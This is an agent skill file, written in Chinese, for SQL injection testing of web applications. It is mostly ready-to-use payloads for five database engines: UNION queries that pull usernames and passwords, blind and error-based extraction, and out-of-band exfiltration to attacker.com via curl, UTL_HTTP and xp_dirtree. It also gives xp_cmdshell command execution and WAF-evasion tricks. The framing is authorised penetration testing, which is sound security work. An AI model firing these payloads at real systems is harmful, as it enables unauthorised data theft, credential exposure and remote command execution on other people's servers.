---
name: sql-injection
description: >
  SQL 注入漏洞测试技能。覆盖联合注入、布尔盲注、时间盲注、报错注入、堆叠查询等攻击向量，
  提供 MySQL/PostgreSQL/MSSQL/Oracle/SQLite 多数据库的特征 Payload，
  包含 WAF 绕过策略和系统化测试流程，适用于 Web 应用 SQL 注入漏洞的发现与确认。
---

# SQL 注入测试技能

系统化检测和验证 Web 应用中的 SQL 注入漏洞。
通过参数篡改、布尔条件判断、时间延迟观测和报错信息分析，
定位 SQL 拼接点并评估可利用性。

---

## 1. SQL 注入分类

### 1.1 带回显注入 (In-band)

**联合查询注入 (UNION-based)**
- 利用 UNION SELECT 将攻击者的查询结果附加到原始查询的输出中
- 前提：能够在页面上看到查询结果

**报错注入 (Error-based)**
- 触发数据库报错，从错误消息中提取数据
- 常见函数：`extractvalue()`, `updatexml()`, `exp()`, `floor(rand())`

### 1.2 盲注 (Blind)

**布尔盲注 (Boolean-based)**
- 通过构造 TRUE/FALSE 条件，观察页面响应差异
- 差异可能是：内容变化、状态码变化、重定向变化

**时间盲注 (Time-based)**
- 通过条件性的时间延迟推断信息
- 无需页面有任何可观察的内容差异

### 1.3 带外注入 (Out-of-band)

- 通过 DNS 查询或 HTTP 请求将数据外带
- 适用于无回显且无法观察时间差异的场景
- 依赖数据库对外网络访问能力

### 1.4 堆叠查询 (Stacked Queries)

- 使用分号 `;` 终止当前查询并执行新查询
- 支持程度取决于数据库驱动和配置
- PHP + MySQLi 默认支持，PDO 默认不支持

---

## 2. 测试方法论

### 2.1 第一阶段：注入点发现

对每个参数尝试基础探针：

```
'
"
\
')
")
;
' OR '1'='1
' OR '1'='2
1 OR 1=1
1 OR 1=2
1' OR '1'='1' --
1' OR '1'='1' #
```

观察响应：
- 数据库报错信息（SQL syntax error）
- 页面内容变化（布尔条件不同时）
- 响应时间差异

### 2.2 第二阶段：数据库类型识别

| 探测方法 | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|----------|-------|------------|-------|--------|--------|
| 字符串连接 | `'a' 'b'` 或 `CONCAT('a','b')` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` | `'a'\|\|'b'` |
| 注释符 | `-- ` 或 `#` | `--` | `--` | `--` | `--` |
| 版本函数 | `VERSION()` | `version()` | `@@VERSION` | `SELECT banner FROM v$version` | `sqlite_version()` |
| 延时函数 | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message('a',5)` | 无内置 |
| 当前用户 | `USER()` | `current_user` | `SYSTEM_USER` | `USER` | N/A |
| 当前数据库 | `DATABASE()` | `current_database()` | `DB_NAME()` | `SELECT ora_database_name FROM dual` | N/A |

### 2.3 第三阶段：注入类型确认

**联合注入确认**

1. 确定列数：
```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY N-- 
-- 或
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 
```

2. 确定回显位：
```sql
' UNION SELECT 1,2,3,...,N-- 
' UNION SELECT 'a','b','c',...-- 
```

3. 提取数据：
```sql
' UNION SELECT username,password FROM users-- 
```

**布尔盲注确认**

```sql
' AND 1=1-- (TRUE, 正常页面)
' AND 1=2-- (FALSE, 异常页面)
' AND SUBSTRING(@@version,1,1)='5'-- 
```

**时间盲注确认**

```sql
' AND SLEEP(5)--          (MySQL)
'; WAITFOR DELAY '0:0:5'--  (MSSQL)
' AND pg_sleep(5)--        (PostgreSQL)
```

### 2.4 第四阶段：数据提取

**MySQL 信息收集**

```sql
-- 列出所有数据库
' UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- 列出指定数据库的表
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- 列出指定表的列
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- 提取数据
' UNION SELECT username,password FROM users--
```

**PostgreSQL 信息收集**

```sql
-- 列出数据库
' UNION SELECT datname,NULL FROM pg_database--

-- 列出表
' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--

-- 列出列
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**MSSQL 信息收集**

```sql
-- 列出数据库
' UNION SELECT name,NULL FROM master..sysdatabases--

-- 列出表
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- 列出列
' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')--
```

---

## 3. 各数据库特征 Payload

### 3.1 MySQL

**报错注入**
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
' AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND exp(~(SELECT * FROM (SELECT version())a))--
```

**时间盲注**
```sql
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--
```

**带外数据外带**
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
```

### 3.2 PostgreSQL

**报错注入**
```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST(chr(126)||version()||chr(126) AS int)--
```

**时间盲注**
```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**带外数据外带**
```sql
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?d='||version()--
```

**命令执行（需要权限）**
```sql
'; CREATE OR REPLACE FUNCTION cmd(text) RETURNS void AS $$ BEGIN PERFORM cmd; END; $$ LANGUAGE plpgsql;--
```

### 3.3 MSSQL

**报错注入**
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

**时间盲注**
```sql
'; IF(1=1) WAITFOR DELAY '0:0:5'--
'; IF(SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'--
```

**带外数据外带**
```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; DECLARE @q varchar(1024);SET @q='\\'+@@version+'.attacker.com\a';EXEC master..xp_dirtree @q--
```

**命令执行**
```sql
'; EXEC xp_cmdshell 'whoami'--
```

### 3.4 Oracle

**报错注入**
```sql
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

**时间盲注**
```sql
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

**带外数据外带**
```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?d='||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual--
```

### 3.5 SQLite

**联合注入**
```sql
' UNION SELECT sql,NULL FROM sqlite_master--
' UNION SELECT tbl_name,NULL FROM sqlite_master WHERE type='table'--
```

**布尔盲注**
```sql
' AND UNICODE(SUBSTR((SELECT sql FROM sqlite_master LIMIT 1),1,1))>64--
```

---

## 4. WAF 绕过策略

### 4.1 空格替代

```sql
'/**/OR/**/1=1--
' OR\t1=1--
'%09OR%091=1--
'%0aOR%0a1=1--
'+OR+1=1--
```

### 4.2 大小写与注释混淆

```sql
' uNiOn SeLeCt 1,2,3--
' UN/**/ION SE/**/LECT 1,2,3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```

### 4.3 编码绕过

```sql
-- URL 双重编码
%252f%252a*/UNION%252f%252a*/SELECT

-- Hex 编码
' UNION SELECT 0x61646d696e--

-- Char 函数
' UNION SELECT CHAR(97,100,109,105,110)--
```

### 4.4 关键字替代

```sql
-- 替代 UNION SELECT
' UNION ALL SELECT 1,2,3--
' UNION DISTINCT SELECT 1,2,3--

-- 替代 OR/AND
' || 1=1--
' && 1=1--

-- 替代引号
' UNION SELECT CHAR(97)--  (不使用字符串引号)
```

### 4.5 分块传输与参数污染

- HTTP Parameter Pollution：`?id=1&id=' UNION SELECT 1,2--`
- 分块传输编码（Chunked Transfer Encoding）
- 多 Content-Type 混淆

---

## 5. 二阶注入 (Second-Order)

输入在存储时未被利用，在后续另一个 SQL 查询中被使用时触发。

典型场景：
1. 注册用户名为 `admin'--`
2. 修改密码功能使用已存储的用户名拼接 SQL
3. 密码被修改为 admin 用户的密码

测试方法：
- 在注册、个人资料编辑等存储点注入 Payload
- 在密码修改、数据导出等后续功能中观察效果

---

## 6. 测试检查清单

- [ ] 对所有参数（GET/POST/Cookie/Header）进行单引号探测
- [ ] 识别数据库类型（通过报错信息或特征函数）
- [ ] 确认注入类型（联合/布尔盲注/时间盲注/报错）
- [ ] 使用 ORDER BY 或 UNION NULL 确定列数
- [ ] 提取数据库版本、当前用户、当前数据库名
- [ ] 枚举表名和列名
- [ ] 评估权限级别（能否读文件/执行命令）
- [ ] 检查是否支持堆叠查询
- [ ] 测试二阶注入可能性
- [ ] 记录完整的注入点、Payload 和提取结果
